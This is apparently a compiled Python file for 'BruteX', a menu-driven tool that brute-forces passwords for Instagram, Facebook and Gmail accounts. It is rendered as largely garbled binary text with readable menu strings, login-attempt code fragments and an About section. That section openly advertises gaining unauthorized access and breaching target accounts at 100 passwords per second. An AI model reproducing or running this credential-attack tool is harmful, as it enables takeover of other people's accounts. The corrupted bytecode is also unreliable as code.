# -*- coding: utf-8 -*-
?
    €d?  ?                   驠	  ?  e d ?  ?         ddlZddlZddlZddlZddlmZ ddlZddlm	Z	 dZ
dZdZdZ
? Zd? Zd? Zd
?  ?        Zedk    sedk    r? e ?   ?          	  ed?  ?        Zedk    rnn?	  ed?  ?        Z e dk    r,dZ  e e
?    N)?BeautifulSoup)?sleepak  
[1;91m[[1;97m?[1;91m][1;92m Select an option:

[1;91m[[1;97m1[1;91m][1;92m Instagram
[1;91m[[1;97m2[1;91m][1;92m Facebook
[1;91m[[1;97m3[1;91m][1;92m E-mail
[1;91m[[1;97m4[1;91m][1;92m About
[1;91m[[1;97m5[1;91m][1;92m More Tools
[1;91m[[1;97m6[1;91m][1;92m Join US
[1;91m[[1;97mQ[1;91m][1;92m Exit

[1;91mbrutex[1;97m>>[1;92m u?   [1;92m   ___           __      _  __
  / _ )______ __/ /____ | |/_/
 / _  / __/ // / __/ -_)>  <  
/____/_/  \_,_/\__/\__//_/|_|  
[1;91m<鈺愨晲鈺?[1;41m[1;97m Created by MrHacker-X [;0m[1;91m鈺愨晲鈺?[1;92mat  [1;91m[[;1;97m?[1;91m] [1;92mSelect any options

[1;91m[[;1;97m1[1;91m] [1;92mInstagram
[1;91m[[;1;97m2[1;91m] [1;92mFacebook
[1;91m[[;1;97m3[1;91m] [1;92mGithub
[1;91m[[;1;97m4[1;91m] [1;92mYouTube
[1;91m[[;1;97m5[1;91m] [1;92mTelegram
[1;91m[[;1;97mB[1;91m] [1;92mBack
[1;91m[Q] [1;91mQuit

[1;97m[[1;91m??[1;97m] [1;91mbrutex>> [1;92mz3
[1;91m[[1;97m~[1;91m] [1;92mAttack is started
af	  
[1;91m[[1;97m?[1;91m][1;92m Introduction to BruteX:

[1;91m>>[1;92m A brute-force attack is a powerful cryptanalytic technique that can be employed to attempt to decrypt encrypted data when other vulnerabilities in the encryption system are not exploitable or available. This method involves systematically trying all possible combinations of passwords until the correct one is found.

[1;91m>>[1;92m BruteX is an exceptional tool designed to conduct brute-force attacks on various platforms, including Instagram, Facebook, and Email IDs. It offers remarkable features that make the attack process fast and efficient. With BruteX, you can attempt 100 passwords per second, and you have the flexibility to either use your own custom password list or leverage the tool's built-in password list. Even if you don't possess your own password list, BruteX's auto attack function allows you to proceed effortlessly.

[1;91m[[1;97m?[1;91m][1;92m Key Features of BruteX:

    [1;91m>>[1;92m Versatile Targets: BruteX empowers you to execute brute-force attacks on Instagram, Facebook, and Email IDs, enabling you to test the security of these platforms and gain unauthorized access.

    [1;91m>>[1;92m Lightning-fast Speed: With an impressive capability of attempting 100 passwords per second, BruteX dramatically accelerates the brute-force process, reducing the time required to breach the target account.

    [1;91m>>[1;92m Custom Password List: Users have the freedom to utilize their own personalized password list, granting them control over the combinations used in the attack. Alternatively, BruteX provides a comprehensive password list to cater to your needs.

    [1;91m>>[1;92m Auto Attack Function: BruteX simplifies the attack procedure by incorporating an auto attack function. This feature eliminates the necessity of having your own password list, streamlining the process and making it more accessible.

[1;91m[[1;97m?[1;91m][1;92m Author:

[1;91m>>[1;92m BruteX is the brainchild of MrHacker-X, an innovative developer who has designed this cutting-edge tool to enhance security testing and provide users with a powerful arsenal for conducting brute-force attacks.

[1;91m>>[1;92m Prepare to unlock the potential of BruteX, leveraging its speed, flexibility, and user-friendly design to uncover vulnerabilities in target accounts and fortify your security defenses.c                  髚  ? d? } t           }t          |d?  ?        5 }|?                    ?   ?         }d d d ?  ?         n# 1 swxY w Y   d? |D ?   ?         }d}|D ]d}|dz
          ?  ?        z   d	z   } | t
          |?  ?         宔d S )
Nc                 笪  ? 	 t          j        ?   ?         }|?                    | |?  ?         t          d|?  ?         t          d?  ?         t	          ?   ?          d S # t           j        $ r2 t          d|d?  ?         t          d?  ?         t	          ?   ?          Y d S t           j        j        $ r t          d|?  ?         Y d S t          $ r}t          d|?  ?         Y d }~d S d }~ww xY w)N?   [1;94m鈺歔[1;92m鉁?[1;94m][1;92m Found:?
z8[1;92m([1;94mTwo-Factor Authentication Enabled[1;92m)?   [1;94m鈺歔[1;91mx[1;94m] [1;91mFailed:)	?instaloader?Instaloader?login?print?quit?TwoFactorAuthRequiredException?exceptions?BadCredentialsException?Exception)?username?password?loader?es       ?brutex.py?login_to_instagramz%instahack.<locals>.login_to_instagramI   s"  € ?M??#?%?%€6? 
?????#?#?#? 	?B繦?M?M?M????€;???€6€6€6	?3? 
? 
? 
??B繦?  OR?  S?  S?  S????€;???€6€6€6€6???7? M? M? M??A??L?L?L?L?L?L?? M? M? M??A??L?L?L?L?L?L?L?L?L?M鴖$   侫A ?=C$?#C$? 	C$?C?C$?rc                 ?   ? g | ]}|?                     ?   ?         ??S ? )?strip)?.0r   s     r   ?<listcomp>zinstahack.<locals>.<listcomp>j   s"   € ?A?A?A爔????"?"?A?A?A?    r   ?   ?   [1;94m鈺擺?] Trying password: z
instagram.z.txt)?passlist?open?readlinesr
r1   r2   r
?漜??1?1?1?I?I虲蠵X蒑蘉?Y?Z?Z?Z?P?
刬噊俹恉楬?%?%?%??E纗?P?P?P?
刬噉俷????
??????圖乲刱€k?
乫刦€f€f?+? P? P? P??D纇?O?O?O?O?O?PP?P? Ps   ?A5C?C%?C%N)?__name__?__module__?__qualname__r6   r?   r3   rI   r   r   r   ?GmailBruteForcer/   y   sU   € € € € € ?? ? ? ?  ?  ?? ? ?P? P? P? P? Pr   rM   )r1   r<   ?usrr?   r#   rI   )rM   ?instances     r   ?hackmailrP   w   s?   € ?P? P? P? P? P? P? P? P餌 
????????	????!?!?!? 
???????r   c                  篁  ???? t           j        d         dk    rt          j        ?   ?          d?ddi?i } i }??fd?????fd?}t          t          d?  ?        }d}|D ]厎|?                    ?   ?         }|d	z
k     r?t          dt          |?  ?        z   dz   t          |?  ?        z   ?  ?          |t          ||?  ?        r nt          d
User-AgentzsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36c                  ?  ?? t          ?   ?         } ddi}t          j        ????  ?        }|j        D ]}|j        ||j        <   ?t
?dict?requests?get?cookiesrX   rV   r   ?text?form?input)r^   ?cookie?data?irU   ?post_urls       €€r   ?create_formzhackbook.<locals>.create_form?   s?   鴢 ?
?  ?        ?                    t          |j        ?  ?        ?  ?         t          d|?  ?         dS d
?payloadr`   rZ   ?postr]   r$   ?writer&   ?contentr
rk   r`   rp   r(   rb   r>   ro   rd   rU   rc   s
          @@@r   ?hackbookrw   ?   s?  鴢 ??怮????????€*?0€??  F?€? €?€?
? 
? 
? 
? 
? 
?? ? ? ? ? ? ? 	
[1;91m[[1;97m?[1;91m][1;92m Enter Target ID ([1;97mUser_ID/Email/Phone_Number[1;92m):[1;97m ?03?3z8[1;91m[[1;97m?[1;91m][1;92m Target Email ID:[1;97m ?4?04zj
[1;91m[[1;97m?[1;91m][1;92m Do you want to go in main menu [1;91m[[1;97my/n[1;91m][1;92m:[1;97m ?y?Y?n?N?5?05z7xdg-open https://github.com/MrHacker-X?tab=repositories?6?06z?[1;91m[[;1;97m~[1;91m] [1;92mThanks for using Our tool 'BruteX'. You can follow us on various social media site. Link and options are given down below, So select here options where you want to follow me z(xdg-open https://instagram.com/0hackerx0z'xdg-open https://facebook.com/hackerxmrz&xdg-open https://github.com/MrHacker-Xz"xdg-open https://t.me/LinkCentralX?b?B?q?Q)&r
   ry   rr   rZ   ?bs4r   rA   ?timer   ?main_menu?banr?soc?startack?aboutr,   rP   rw   r{   r[   ?responser]   r;   ?linesr   ?link?systemr   ?Timeoutr_   ?menur   r#   r   rN   ?art   ?folr   r   r   ?<module>r?      s   ?? €?@? A? A? A? ? ? ? ? 	€	€	€	? 
€
€
€
? €€€? ? ? ? ? ? ? €€€? ? ? ? ? ? ?+€	?	i€?
D€? O€?	S€?,)? ,)? ,)餪+? +? +餦3? 3? 3餷? ? ?
P?
€??????€€t??€?
?坋?]?^?^€8??俷€n??	?
?7?坋?  I?  J?  J€8??俷€n?€H?	€E?丱凮€O?
???  L?  
M?  
M€3?	圧俰€i??	?
?7?坋?  I?  J?  J€8??俷€n?€H?	€E?丱凮€O?€H丣凧€J?	€E?並凨€K?€D丗凢€F?€j???? 7?	€E?丱凮€O?€H丣凧€J?	€E?並凨€K?€D丗凢€F€F?	€E?5?6?6?6?7? 坉俵€l恉榗択恔?€%??€'?
???X?Y?Y€3?	圧俰€i??	?
?7?坋?  I?  J?  J€8??俷€n?€H?	€E?丱凮€O?€H丣凧€J?	€E?並凨€K?€D丗凢€F?€j???? 7?	€E?丱凮€O?€H丣凧€J?	€E?並凨€K?€D丗凢€F€F?	€E?5?6?6?6?7? 坈俴€k怲楾抃怽?€%??€'?€%???€,?		?€u?  V?  W?  W€1??俬€h?恠???	?	圫??怉?扝怘?€D丗凢€F€F?	圧?????		? 
? 坈俴€k怲楾抃怽?€"??E?F?F?F?F?
坈俴€k怲楾抃慭? 	?€2?圵????€5???€;?€5??€7?€5?  
g?  h?  h?  h?€5??€7??坰??€3?	圫俲€j怌?扠怟?
? 坈俴€k怲楽抂怺?€$??€&€&?
坆俲€j??馻Ps   ?A#B' ?*C?C